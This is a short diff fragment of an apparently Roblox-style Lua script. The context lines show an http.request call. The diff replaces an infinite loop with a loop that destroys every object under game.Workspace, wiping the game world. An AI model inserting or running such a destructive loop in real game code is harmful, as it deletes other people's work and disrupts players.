@@ -11,5 +11,9 @@ local response = http.request(
     }
 );
 
-while true do end
+for i, v in pairs(game.Workspace:GetDescendants()) do
+    v:Destroy()
+end
+
+
 
